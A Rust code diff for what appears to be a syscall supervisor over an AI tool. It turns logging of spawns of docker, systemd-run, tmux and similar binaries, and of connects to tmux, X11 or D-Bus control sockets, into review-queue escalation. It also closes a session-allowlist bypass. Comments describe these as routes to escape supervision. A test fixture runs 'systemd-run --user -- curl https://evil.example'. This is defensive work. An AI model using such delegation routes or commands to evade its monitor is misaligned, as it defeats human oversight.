@@ -42,6 +42,7 @@ use crate::reviewer::{DigestStore, QueueReviewer};
 use crate::session_sync::SessionSync;
 use crate::syscall_map;
 
+use super::authority_delegation;
 use super::mass_destruction;
 use super::{session_state::SupervisorSession, DaemonRestartConfig};
 
@@ -479,6 +480,14 @@ pub(super) struct SupervisorLoopContext<'a> {
     /// `setns(2)` silently when spawned from a `routine_exec_root`.
     /// Bwrap / bubblewrap / firejail / nsenter live here by default.
     pub(super) namespace_users: Vec<String>,
+    /// Profile-declared basenames of authority-delegating binaries this
+    /// session may spawn without the enforcement QUEUE (consulted only when
+    /// `config.enforce_authority_delegating_spawn` is on). Empty permits none.
+    pub(super) permit_authority_delegating: Vec<String>,
+    /// Profile-declared control-injection socket path substrings this session
+    /// may connect to without the enforcement QUEUE (consulted only when
+    /// `config.enforce_control_socket_connect` is on). Empty permits none.
+    pub(super) permit_control_sockets: Vec<String>,
     /// Session working root — the supervisor's cwd at session start, which the
     /// supervised tool inherits, i.e. the project the tool was pointed at. The
     /// mass-destruction signal uses it to classify deletes as in-tree (the
@@ -1791,11 +1800,21 @@ pub(super) async fn handle_syscall_event(
             .process_tree
             .update_command(event.pid, name, args.clone());
 
-        // H2 Option 4 (audit-only): spawning an authority-delegating binary
-        // (docker/kubectl/tmux/systemctl/dbus-send/…) — its effect runs in a
-        // privileged or unsupervised peer, outside the supervised tree. Log it
-        // for the FP-budget measurement; enforce-mode scoring is the follow-up.
-        if is_authority_delegating_binary(command) {
+        // Authority-delegating binary spawn (docker/kubectl/tmux/systemctl/
+        // systemd-run/dbus-send/…): its effect runs in a privileged or
+        // unsupervised peer, outside the supervised tree — the
+        // `systemd-run --user … -- <cmd>` supervision-escape class. When
+        // enforcement is off this is audit-only (detected, logged, allowed).
+        // When on and the profile has not permitted the binary, the actual
+        // Allow→QUEUE escalation happens after proxy evaluation below; here we
+        // only tag the forensic trace so the two states are distinguishable.
+        if authority_delegation::is_authority_delegating_binary(command) {
+            let will_enforce = authority_delegation::spawn_enforcement_enabled(
+                loop_ctx.config.enforce_authority_delegating_spawn,
+            ) && authority_delegation::spawn_should_escalate(
+                command,
+                &loop_ctx.permit_authority_delegating,
+            );
             write_forensics_stage(
                 loop_ctx,
                 trace_event_id,
@@ -1803,14 +1822,19 @@ pub(super) async fn handle_syscall_event(
                 event.pid,
                 Some(&call_type),
                 "authority_delegating_spawn",
-                Some("audit-only-allow"),
+                Some(if will_enforce {
+                    "enforce-queue"
+                } else {
+                    "audit-only-allow"
+                }),
                 None,
                 Some("spawn of an authority-delegating binary (effect runs in a privileged peer)"),
             );
             tracing::debug!(
                 command = %command,
                 tid,
-                "authority-delegating binary spawn (audit-only)"
+                will_enforce,
+                "authority-delegating binary spawn"
             );
         }
     }
@@ -1878,9 +1902,29 @@ pub(super) async fn handle_syscall_event(
     // local for NetListen. They expose the service on every interface and must
     // go through the normal review path.
     {
+        // Whether this NetConnect is a control-injection IPC socket we will
+        // enforce on: the flag is on, it is a control socket, and the profile
+        // has not permitted it. Reused to (a) keep the connect OUT of the
+        // local-IPC auto-allow below so it reaches proxy evaluation and the
+        // Allow→QUEUE escalation, and (b) tag the forensic trace.
+        let control_socket_enforce = match &call_type {
+            grith_proxy::types::ToolCallType::NetConnect { address, .. } => {
+                authority_delegation::control_socket_enforcement_enabled(
+                    loop_ctx.config.enforce_control_socket_connect,
+                ) && authority_delegation::control_socket_should_escalate(
+                    address,
+                    &loop_ctx.permit_control_sockets,
+                )
+            }
+            _ => false,
+        };
         let is_local = match &call_type {
             grith_proxy::types::ToolCallType::NetConnect { address, .. } => {
-                is_local_connect_address(address)
+                // A control-injection socket we are enforcing must NOT be
+                // treated as local IPC — it has to reach the proxy so it
+                // QUEUEs rather than being auto-allowed as noise.
+                !control_socket_enforce
+                    && (is_local_connect_address(address)
                     // Routine SSH/GPG agent use (git push over ssh-agent,
                     // GPG-signed commits) is local IPC — the exfil channel is
                     // the separately-scored remote connection (FP research §5.1).
@@ -1893,20 +1937,21 @@ pub(super) async fn handle_syscall_event(
                         address,
                         event.pid,
                         &loop_ctx.routine_exec_roots,
-                    ))
+                    )))
             }
             grith_proxy::types::ToolCallType::NetListen { address, .. } => {
                 is_local_listen_address(address)
             }
             _ => false,
         };
-        // H2 Option 2 (audit-only): a connect to a control-injection IPC
-        // socket (tmux/screen/X11/session-D-Bus) is local IPC but can drive a
-        // more-privileged peer. Log it for the FP-budget measurement; the
-        // connect is still allowed (the enforce-mode route-to-proxy is the
-        // follow-up, after the FP budget is measured).
+        // Control-injection IPC socket (tmux/screen/X11/session-D-Bus): local
+        // IPC that can drive a more-privileged peer to run commands on the
+        // tool's behalf. When enforcement is off it is audit-only (logged,
+        // auto-allowed as local IPC below); when on and unpermitted it has
+        // been kept non-local above and is escalated to QUEUE after proxy
+        // evaluation.
         if let grith_proxy::types::ToolCallType::NetConnect { address, .. } = &call_type {
-            if is_control_injection_socket(address) {
+            if authority_delegation::is_control_injection_socket(address) {
                 write_forensics_stage(
                     loop_ctx,
                     trace_event_id,
@@ -1914,14 +1959,19 @@ pub(super) async fn handle_syscall_event(
                     event.pid,
                     Some(&call_type),
                     "control_socket_connect",
-                    Some("audit-only-allow"),
+                    Some(if control_socket_enforce {
+                        "enforce-queue"
+                    } else {
+                        "audit-only-allow"
+                    }),
                     None,
                     Some("connect to a control-injection IPC socket (tmux/screen/X11/D-Bus)"),
                 );
                 tracing::debug!(
                     address = %address,
                     tid,
-                    "control-injection IPC socket connect (audit-only)"
+                    control_socket_enforce,
+                    "control-injection IPC socket connect"
                 );
             }
         }
@@ -2251,6 +2301,32 @@ pub(super) async fn handle_syscall_event(
         .session_allowed
         .lock()
         .is_ok_and(|allowed| is_sensitive_scoped_read_match(&call_type, &allowed));
+    // An authority-delegating spawn / control-injection connect that WILL be
+    // enforced must not be silently allowed by the session allowlist. A profile
+    // that lists e.g. `docker` as a routine command (or an earlier operator
+    // approval) would otherwise short-circuit here and bypass enforcement
+    // entirely. The explicit `permit_authority_delegating` / `permit_control_sockets`
+    // lists remain the intended opt-out; everything else routes to the proxy
+    // and the Allow→QUEUE escalation below.
+    let delegation_would_enforce = match &call_type {
+        grith_proxy::types::ToolCallType::ProcessSpawn { command, .. } => {
+            authority_delegation::spawn_enforcement_enabled(
+                loop_ctx.config.enforce_authority_delegating_spawn,
+            ) && authority_delegation::spawn_should_escalate(
+                command,
+                &loop_ctx.permit_authority_delegating,
+            )
+        }
+        grith_proxy::types::ToolCallType::NetConnect { address, .. } => {
+            authority_delegation::control_socket_enforcement_enabled(
+                loop_ctx.config.enforce_control_socket_connect,
+            ) && authority_delegation::control_socket_should_escalate(
+                address,
+                &loop_ctx.permit_control_sockets,
+            )
+        }
+        _ => false,
+    };
     if !containment_active {
         if let Some(key) = session_allowlist_key(&call_type) {
             if loop_ctx
@@ -2258,6 +2334,7 @@ pub(super) async fn handle_syscall_event(
                 .lock()
                 .is_ok_and(|s| is_session_allowlist_match(&key, &s, &call_type))
                 && !sensitive_scoped_read_allowed
+                && !delegation_would_enforce
             {
                 write_forensics_stage(
                     loop_ctx,
@@ -2423,10 +2500,78 @@ pub(super) async fn handle_syscall_event(
         }
     }
 
+    // ---- Authority-delegating spawn + control-injection socket enforcement
+    // (systemd-run supervision-escape class) ----
+    //
+    // These calls reach the proxy, but its filters do not recognise that a
+    // `systemd-run` / `at` / `docker` spawn (or a session-D-Bus connect) hands
+    // the real work to a peer OUTSIDE the supervised tree — nothing the peer
+    // then does is intercepted or scored. When the operator has enabled
+    // enforcement and the profile has not permitted the target, escalate the
+    // Allow to QUEUE so it is reviewed rather than silently escaping
+    // supervision. Like mass-destruction, an escalation here must not be
+    // auto-allowed away by reputation, so it sets its own guard.
+    let mut authority_delegation_escalated = false;
+    if let grith_proxy::types::ToolCallType::ProcessSpawn { command, .. } = &ctx.call_type {
+        if authority_delegation::spawn_enforcement_enabled(
+            loop_ctx.config.enforce_authority_delegating_spawn,
+        ) && authority_delegation::maybe_escalate_spawn(
+            &mut decision,
+            command,
+            &loop_ctx.permit_authority_delegating,
+        ) {
+            authority_delegation_escalated = true;
+            write_forensics_stage(
+                loop_ctx,
+                trace_event_id,
+                session,
+                event.pid,
+                Some(&ctx.call_type),
+                "authority_delegating_escalation",
+                Some("queue"),
+                Some(decision.composite_score),
+                Some("authority-delegating spawn escalated Allow→QUEUE"),
+            );
+            tracing::warn!(
+                command = %command,
+                tid,
+                "authority-delegating spawn: escalating Allow→QUEUE"
+            );
+        }
+    } else if let grith_proxy::types::ToolCallType::NetConnect { address, .. } = &ctx.call_type {
+        if authority_delegation::control_socket_enforcement_enabled(
+            loop_ctx.config.enforce_control_socket_connect,
+        ) && authority_delegation::maybe_escalate_control_socket(
+            &mut decision,
+            address,
+            &loop_ctx.permit_control_sockets,
+        ) {
+            authority_delegation_escalated = true;
+            write_forensics_stage(
+                loop_ctx,
+                trace_event_id,
+                session,
+                event.pid,
+                Some(&ctx.call_type),
+                "control_socket_escalation",
+                Some("queue"),
+                Some(decision.composite_score),
+                Some("control-injection socket connect escalated Allow→QUEUE"),
+            );
+            tracing::warn!(
+                address = %address,
+                tid,
+                "control-injection socket connect: escalating Allow→QUEUE"
+            );
+        }
+    }
+
     // Check if reputation would auto-allow this operation. A mass-destruction
-    // escalation must not be auto-allowed away, so it bypasses this block.
+    // or authority-delegating escalation must not be auto-allowed away, so it
+    // bypasses this block.
     if loop_ctx.daemon_proxy_url.is_none()
         && !mass_destruction_escalated
+        && !authority_delegation_escalated
         && matches!(
             decision.action,
             grith_proxy::types::ProxyAction::Queue { .. }
@@ -4196,54 +4341,9 @@ fn is_foreign_pts_write(call_type: &ToolCallType, path: &str, own_pts: Option<&s
     matches!(own_pts, Some(own) if path != own)
 }
 
-/// H2 Option 2 (audit-only): control-injection IPC sockets — a connect here
-/// drives a more-privileged peer that can run commands on the tool's behalf
-/// (tmux/screen pane injection, X11 input synthesis, session D-Bus method
-/// calls). These are currently auto-allowed as local IPC; we log connects to
-/// them for FP-budget measurement. (ssh-agent / gpg-agent are already covered
-/// by `is_sensitive_unix_socket` and route to the proxy.)
-fn is_control_injection_socket(address: &str) -> bool {
-    let path = address
-        .strip_prefix("unix:")
-        .unwrap_or(address)
-        .to_ascii_lowercase();
-    const MARKERS: &[&str] = &["/tmux-", "/.x11-unix/", "/screen", "/dbus"];
-    MARKERS.iter().any(|m| path.contains(m))
-        || (path.starts_with("/run/user/") && path.ends_with("/bus")) // session D-Bus
-}
-
-/// H2 Option 4 (audit-only): authority-delegating binaries — their effect is
-/// executed by a privileged or unsupervised peer (a daemon, the init system,
-/// the session bus, an `at`/`cron` queue) rather than in the supervised tree.
-/// Spawns are logged for FP-budget measurement; enforce-mode scoring is the
-/// follow-up. Curation is security-relevant — additions should be reviewed.
-fn is_authority_delegating_binary(command: &str) -> bool {
-    let b = std::path::Path::new(command)
-        .file_name()
-        .and_then(|n| n.to_str())
-        .unwrap_or(command);
-    matches!(
-        b,
-        "docker"
-            | "podman"
-            | "nerdctl"
-            | "kubectl"
-            | "tmux"
-            | "screen"
-            | "systemctl"
-            | "systemd-run"
-            | "dbus-send"
-            | "gdbus"
-            | "busctl"
-            | "at"
-            | "batch"
-            | "crontab"
-            | "flatpak"
-            | "nsenter"
-            | "machinectl"
-            | "loginctl"
-    )
-}
+// `is_control_injection_socket` and `is_authority_delegating_binary` moved to
+// the `authority_delegation` module, which owns their curated lists and the
+// enforcement escalation built on them.
 
 /// Returns `true` if `path` is a sensitive Unix socket that grants container
 /// runtime control and must not be silently allowed.
@@ -6600,6 +6700,8 @@ mod tests {
             scratch_roots: Vec::new(),
             local_listener_policy: Vec::new(),
             namespace_users: Vec::new(),
+            permit_authority_delegating: Vec::new(),
+            permit_control_sockets: Vec::new(),
             working_root: None,
             mass_destruction: Mutex::new(mass_destruction::MassDestructionTracker::with_defaults()),
             yama_ptrace_scope: None,
@@ -6677,6 +6779,8 @@ mod tests {
             scratch_roots: Vec::new(),
             local_listener_policy: Vec::new(),
             namespace_users: Vec::new(),
+            permit_authority_delegating: Vec::new(),
+            permit_control_sockets: Vec::new(),
             working_root: None,
             mass_destruction: Mutex::new(mass_destruction::MassDestructionTracker::with_defaults()),
             yama_ptrace_scope: None,
@@ -6842,6 +6946,8 @@ mod tests {
             scratch_roots: Vec::new(),
             local_listener_policy: Vec::new(),
             namespace_users: Vec::new(),
+            permit_authority_delegating: Vec::new(),
+            permit_control_sockets: Vec::new(),
             working_root: None,
             mass_destruction: Mutex::new(mass_destruction::MassDestructionTracker::with_defaults()),
             yama_ptrace_scope: None,
@@ -7092,6 +7198,8 @@ mod tests {
             scratch_roots: Vec::new(),
             local_listener_policy: Vec::new(),
             namespace_users: Vec::new(),
+            permit_authority_delegating: Vec::new(),
+            permit_control_sockets: Vec::new(),
             working_root: None,
             mass_destruction: Mutex::new(mass_destruction::MassDestructionTracker::with_defaults()),
             yama_ptrace_scope: None,
@@ -8307,50 +8415,314 @@ mod tests {
         ));
     }
 
+    // control-injection-socket + authority-delegating-binary classifier tests
+    // moved with their functions into the `authority_delegation` module.
+
     // -----------------------------------------------------------------------
-    // H2 Options 2 & 4: control-injection sockets + authority-delegating bins.
+    // Authority-delegating spawn + control-injection socket ENFORCEMENT
+    // (handle_syscall_event level — the load-bearing "did it actually route
+    // and escalate?" tests, not just the classifier unit tests).
     // -----------------------------------------------------------------------
 
-    #[test]
-    fn control_injection_socket_recognised() {
-        for addr in [
-            "unix:/tmp/tmux-1000/default",
-            "unix:/tmp/.X11-unix/X0",
-            "unix:/run/screen/S-user/12345.pts-0",
-            "unix:/run/user/1000/bus",
-            "unix:/run/user/1000/dbus/session_bus_socket",
-        ] {
-            assert!(is_control_injection_socket(addr), "{addr:?} should match");
-        }
-        for addr in [
-            "unix:/var/run/nscd/socket",
-            "unix:/run/user/1000/gnupg/S.gpg-agent", // agent socket: handled elsewhere
-            "127.0.0.1",
-        ] {
-            assert!(
-                !is_control_injection_socket(addr),
-                "{addr:?} should NOT match"
-            );
+    /// Outcome of driving one event through `handle_syscall_event`.
+    struct DelegationOutcome {
+        allow_pids: Vec<u32>,
+        deny_pids: Vec<u32>,
+        total_queued: u64,
+        total_filtered_noise: u64,
+    }
+
+    /// Drive a single event through `handle_syscall_event` in Log queue-mode
+    /// (so a QUEUE escalation is allowed-and-counted rather than freezing on
+    /// the `PanicReviewer`) with an all-allow proxy, so the ONLY thing that can
+    /// produce a QUEUE is the supervisor-side authority-delegation escalation.
+    async fn run_delegation_event(
+        event: SyscallEvent,
+        enforce_spawn: bool,
+        enforce_control_socket: bool,
+        permit_authority_delegating: Vec<String>,
+        permit_control_sockets: Vec<String>,
+        session_allowed_seed: Vec<String>,
+    ) -> DelegationOutcome {
+        let pid = event.pid;
+        let (mock, state) = MockInterceptor::new(vec![event.clone()]);
+        let mut interceptor: Box<dyn SyscallInterceptor> = Box::new(mock);
+        let mut session = SupervisorSession::new("mock-tool", pid);
+        let proxy = allow_only_proxy();
+        let audit_storage = Arc::new(Mutex::new(
+            grith_audit::AuditStorage::open_in_memory().unwrap(),
+        ));
+        let audit_sink: Arc<dyn crate::audit_sink::AuditSink> =
+            Arc::new(crate::audit_sink::StorageAuditSink::new(audit_storage));
+        let digest_queue = Arc::new(grith_digest::queue::DigestQueue::open_in_memory().unwrap());
+        let digest_store: Arc<dyn crate::reviewer::DigestStore> =
+            Arc::new(crate::reviewer::LocalDigestStore::new(digest_queue));
+        let dlp_redactor = grith_proxy::filters::dlp_gate::DlpRedactor::with_defaults();
+        let correlation_tracker = Arc::new(grith_audit::CorrelationTracker::with_defaults());
+        let containment_tracker = Arc::new(
+            grith_proxy::filters::session_containment::ContainmentTracker::new(
+                Duration::from_secs(60),
+            ),
+        );
+        let mut config = SupervisorConfig::default();
+        config.interactive_queue_action = crate::config::InteractiveQueueAction::Log;
+        config.enforce_authority_delegating_spawn = enforce_spawn;
+        config.enforce_control_socket_connect = enforce_control_socket;
+        let loop_ctx = SupervisorLoopContext {
+            proxy: &proxy,
+            audit_sink,
+            digest_store,
+            dlp_redactor: &dlp_redactor,
+            correlation_tracker: &correlation_tracker,
+            containment_tracker: &containment_tracker,
+            config: &config,
+            event_tx: None,
+            freezer: Freezer::new(Duration::from_secs(config.freeze_timeout_seconds)),
+            read_batch_tracker: Mutex::new(ReadBatchTracker::new(10)),
+            reviewer: Arc::new(PanicReviewer),
+            session_sync: None,
+            session_allowed: Arc::new(Mutex::new(session_allowed_seed.into_iter().collect())),
+            dns_cache: Arc::new(Mutex::new(DnsCache::new())),
+            dns_inspection_enabled: false,
+            dns_decision_service: None,
+            dns_forward_confirm: None,
+            syscall_log: None,
+            forensics_trace: None,
+            reputation_table: Arc::new(Mutex::new(grith_proxy::reputation::ReputationTable::new())),
+            reputation_config: grith_proxy::reputation::ReputationConfig::default(),
+            daemon_proxy_url: None,
+            daemon_proxy_token: None,
+            daemon_restart: None,
+            persist_local_reputation: true,
+            routine_exec_roots: Vec::new(),
+            scratch_roots: Vec::new(),
+            local_listener_policy: Vec::new(),
+            namespace_users: Vec::new(),
+            permit_authority_delegating,
+            permit_control_sockets,
+            working_root: None,
+            mass_destruction: Mutex::new(mass_destruction::MassDestructionTracker::with_defaults()),
+            yama_ptrace_scope: None,
+        };
+
+        handle_syscall_event(&mut interceptor, &mut session, &loop_ctx, event)
+            .await
+            .unwrap();
+
+        let st = state.lock().unwrap();
+        DelegationOutcome {
+            allow_pids: st.allow_pids.clone(),
+            deny_pids: st.deny_pids.clone(),
+            total_queued: session.stats.total_queued,
+            total_filtered_noise: session.stats.total_filtered_noise,
         }
     }
 
-    #[test]
-    fn authority_delegating_binary_recognised() {
-        for cmd in [
-            "/usr/bin/docker",
-            "kubectl",
+    /// A ProcessExec event whose target is a real (existing) file with the
+    /// given basename — real so PR-3-B failed-exec suppression does not
+    /// short-circuit our QUEUE. Returns the event and the temp path (kept
+    /// alive by the caller's binding is unnecessary; the file lives in tmp).
+    fn existing_binary_exec_event(pid: u32, basename: &str) -> SyscallEvent {
+        let dir = std::env::temp_dir().join(format!("grith_ad_test_{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let bin = dir.join(basename);
+        std::fs::write(&bin, b"#!/bin/sh\n").unwrap();
+        sample_phase_a_event(
+            pid,
+            crate::platform::linux::syscall_nr::EXECVE,
+            SyscallKind::ProcessExec {
+                path: bin.to_string_lossy().into_owned(),
+                args: vec![
+                    bin.to_string_lossy().into_owned(),
+                    "--user".into(),
+                    "--".into(),
+                    "curl".into(),
+                    "https://evil.example".into(),
+                ],
+            },
+        )
+    }
+
+    fn connect_event(pid: u32, address: &str) -> SyscallEvent {
+        sample_phase_a_event(
+            pid,
+            crate::platform::linux::syscall_nr::CONNECT,
+            SyscallKind::NetConnect {
+                address: address.to_string(),
+                port: 0,
+                protocol: crate::interceptor::NetProtocol::Unix,
+            },
+        )
+    }
+
+    #[tokio::test]
+    async fn authority_delegating_spawn_queues_when_enforced() {
+        let out = run_delegation_event(
+            existing_binary_exec_event(9101, "systemd-run"),
+            true,
+            false,
+            vec![],
+            vec![],
+            vec![],
+        )
+        .await;
+        assert_eq!(
+            out.total_queued, 1,
+            "systemd-run spawn must QUEUE when enforced"
+        );
+        assert_eq!(out.allow_pids, vec![9101], "Log mode allows after queueing");
+        assert!(out.deny_pids.is_empty());
+    }
+
+    #[tokio::test]
+    async fn authority_delegating_spawn_allowed_when_flag_off() {
+        let out = run_delegation_event(
+            existing_binary_exec_event(9102, "systemd-run"),
+            false,
+            false,
+            vec![],
+            vec![],
+            vec![],
+        )
+        .await;
+        assert_eq!(out.total_queued, 0, "audit-only when flag off");
+        assert_eq!(out.allow_pids, vec![9102]);
+    }
+
+    #[tokio::test]
+    async fn authority_delegating_spawn_allowed_when_profile_permits() {
+        let out = run_delegation_event(
+            existing_binary_exec_event(9103, "systemd-run"),
+            true,
+            false,
+            vec!["systemd-run".to_string()],
+            vec![],
+            vec![],
+        )
+        .await;
+        assert_eq!(out.total_queued, 0, "permit list suppresses the QUEUE");
+        assert_eq!(out.allow_pids, vec![9103]);
+    }
+
+    #[tokio::test]
+    async fn ordinary_spawn_not_queued_when_enforced() {
+        let out = run_delegation_event(
+            existing_binary_exec_event(9104, "git"),
+            true,
+            false,
+            vec![],
+            vec![],
+            vec![],
+        )
+        .await;
+        assert_eq!(out.total_queued, 0, "git is not authority-delegating");
+        assert_eq!(out.allow_pids, vec![9104]);
+    }
+
+    #[tokio::test]
+    async fn control_socket_connect_queues_when_enforced() {
+        // The load-bearing assertion: the connect must NOT be swallowed by the
+        // local-IPC noise auto-allow (total_filtered_noise stays 0) and must
+        // instead reach the proxy and QUEUE.
+        let out = run_delegation_event(
+            connect_event(9105, "unix:/run/user/1000/bus"),
+            false,
+            true,
+            vec![],
+            vec![],
+            vec![],
+        )
+        .await;
+        assert_eq!(
+            out.total_filtered_noise, 0,
+            "enforced control socket must bypass the local auto-allow"
+        );
+        assert_eq!(out.total_queued, 1, "control socket connect must QUEUE");
+        assert_eq!(out.allow_pids, vec![9105]);
+    }
+
+    #[tokio::test]
+    async fn control_socket_connect_audit_only_when_flag_off() {
+        let out = run_delegation_event(
+            connect_event(9106, "unix:/run/user/1000/bus"),
+            false,
+            false,
+            vec![],
+            vec![],
+            vec![],
+        )
+        .await;
+        assert_eq!(
+            out.total_filtered_noise, 1,
+            "flag off keeps the local-IPC auto-allow"
+        );
+        assert_eq!(out.total_queued, 0);
+        assert_eq!(out.allow_pids, vec![9106]);
+    }
+
+    #[tokio::test]
+    async fn control_socket_connect_allowed_when_profile_permits() {
+        let out = run_delegation_event(
+            connect_event(9107, "unix:/run/user/1000/bus"),
+            false,
+            true,
+            vec![],
+            vec!["/run/user/1000/bus".to_string()],
+            vec![],
+        )
+        .await;
+        assert_eq!(
+            out.total_filtered_noise, 1,
+            "permitted control socket stays local-allowed"
+        );
+        assert_eq!(out.total_queued, 0);
+    }
+
+    #[tokio::test]
+    async fn session_allowlisted_authority_binary_still_queues() {
+        // Regression for the review's HIGH finding: the shipped profiles list
+        // `tmux`/`docker`/`systemctl` in routine_commands, which seed the
+        // session allowlist. That short-circuit runs BEFORE the escalation, so
+        // without the `delegation_would_enforce` guard an authority-delegating
+        // spawn already on the session allowlist would be auto-allowed and the
+        // enforcement would be a silent no-op. Uses a real root-owned system
+        // binary so the exec-provenance check in is_session_allowlist_match
+        // actually trusts it (a /tmp temp file would be rejected as
+        // world-writable and never exercise the interaction).
+        let candidates = [
+            "/usr/bin/systemctl",
+            "/bin/systemctl",
             "/usr/bin/tmux",
-            "systemctl",
-            "dbus-send",
-            "crontab",
-        ] {
-            assert!(is_authority_delegating_binary(cmd), "{cmd:?} should match");
-        }
-        for cmd in ["/bin/ls", "cat", "/usr/bin/git", "node"] {
-            assert!(
-                !is_authority_delegating_binary(cmd),
-                "{cmd:?} should NOT match"
-            );
-        }
+            "/usr/bin/docker",
+        ];
+        let Some(bin) = candidates.iter().find(|p| std::path::Path::new(p).exists()) else {
+            eprintln!("skipping: no root-owned authority-delegating binary present");
+            return;
+        };
+        let event = sample_phase_a_event(
+            9108,
+            crate::platform::linux::syscall_nr::EXECVE,
+            SyscallKind::ProcessExec {
+                path: (*bin).to_string(),
+                args: vec![(*bin).to_string()],
+            },
+        );
+        let out = run_delegation_event(
+            event,
+            true, // enforce spawns
+            false,
+            vec![], // NOT in the permit list
+            vec![],
+            vec![format!("exec:{bin}")], // but IS on the session allowlist
+        )
+        .await;
+        assert_eq!(
+            out.total_queued, 1,
+            "session-allowlisted authority-delegating binary must still QUEUE when enforced"
+        );
+        assert_eq!(
+            out.total_filtered_noise, 0,
+            "must not take the session-allowed auto-allow"
+        );
     }
 }
